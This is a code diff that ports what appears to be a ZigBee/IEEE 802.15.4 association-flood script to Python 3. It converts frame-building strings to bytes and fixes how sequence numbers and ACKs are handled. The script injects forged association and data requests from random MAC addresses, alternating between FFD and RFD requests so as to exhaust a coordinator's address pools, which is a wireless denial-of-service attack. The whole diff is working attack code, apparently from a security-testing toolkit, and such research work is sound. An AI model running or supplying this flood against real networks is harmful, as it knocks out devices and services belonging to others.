@@ -41,8 +41,9 @@ def watchforaresp(kb, timeout=1):
             if (fcf & DOT154_FCF_TYPE_MASK) != DOT154_FCF_TYPE_MACCMD:
                 continue
 
-            # Command Frame ID is the first byte of the payload
-            if d154list[7][0] != "\x02":
+            # Command Frame ID is the first byte of the payload (int in py3 bytes)
+            cmdid = d154list[7][0]
+            if (cmdid if isinstance(cmdid, int) else ord(cmdid)) != 0x02:
                 continue
 
             kb.sniffer_off()
@@ -68,27 +69,27 @@ if __name__ == '__main__':
                "\xff\x00\x00\x00\x00\x00\x00\x00\x00\x01\x8e"
 
     # Association Request Frame in list form, split where we need to modify
-    assocreqp = [   "\x23\xc8",
-                    "", # Seq num
-                    "", # Dest PANID
-                    "\x00\x00", # Destination (coordinator)
-                    "\xff\xff", # Source PAN (broadcast)
-                    "", # Address field
-                    "\x01\x8e\x67" # Command Frame payload/assoc req
+    assocreqp = [   b"\x23\xc8",
+                    b"", # Seq num
+                    b"", # Dest PANID
+                    b"\x00\x00", # Destination (coordinator)
+                    b"\xff\xff", # Source PAN (broadcast)
+                    b"", # Address field
+                    b"\x01\x8e\x67" # Command Frame payload/assoc req
                 ]
 
     # Data Request Frame in list form, split where we need to modify
-    datareqp = [    "\x63\xc8",   # FC (intra PAN set)
-                    "", # Seq num
-                    "", # Dest PANID
-                    "\x00\x00", # Destination (coordinator)
-                    "", # Source ext address
-                    "\x04" # Command Frame data request
+    datareqp = [    b"\x63\xc8",   # FC (intra PAN set)
+                    b"", # Seq num
+                    b"", # Dest PANID
+                    b"\x00\x00", # Destination (coordinator)
+                    b"", # Source ext address
+                    b"\x04" # Command Frame data request
                 ]
 
     # ACK Frame in list form, split where we need to modify
-    ackp = ["\x02\x00",    # FC
-            ""      # ACK'd seq num
+    ackp = [b"\x02\x00",    # FC
+            b""      # ACK'd seq num
             ]
 
     while len(sys.argv) > 1:
@@ -140,22 +141,24 @@ if __name__ == '__main__':
     
         mac = randmac()
 
-        assocreqp[1] = "%c" % seqnum
+        assocreqp[1] = bytes([seqnum])
+        if isinstance(mac, str):
+            mac = mac.encode("latin1")
         assocreqp[5] = mac
         # Per Ben Ramsey's contribution 9/20/12, rmspeers has:
         # Alternate requests as an FFD or RFD to exhaust both address pools
         ffdswitch = not ffdswitch
         if ffdswitch:
-            assocreqp[6] = "\x01\x8e\x67"  # Full Function Device (FFD)
+            assocreqp[6] = b"\x01\x8e\x67"  # Full Function Device (FFD)
         else:
-            assocreqp[6] = "\x01\x8c\x67"  # Reduced Function Device (RFD)
+            assocreqp[6] = b"\x01\x8c\x67"  # Reduced Function Device (RFD)
 
         assocreqinj = b''.join(assocreqp)
 
         seqnum += 1
-        datareqp[1] = "%c" % seqnum
+        datareqp[1] = bytes([seqnum])
         datareqp[4] = mac
-        datareqinj = ''.join(datareqp)
+        datareqinj = b''.join(datareqp)
 
         try:
             # Send the associate request frame
@@ -179,8 +182,8 @@ if __name__ == '__main__':
 
         try:
             if seq != None:
-                ackp[1] = seq
-                ackinj = ''.join(ackp)
+                ackp[1] = seq if isinstance(seq, (bytes, bytearray)) else bytes([seq])
+                ackinj = b''.join(ackp)
                 kb.inject(ackinj)
                 sys.stdout.write("+")
                 sys.stdout.flush()
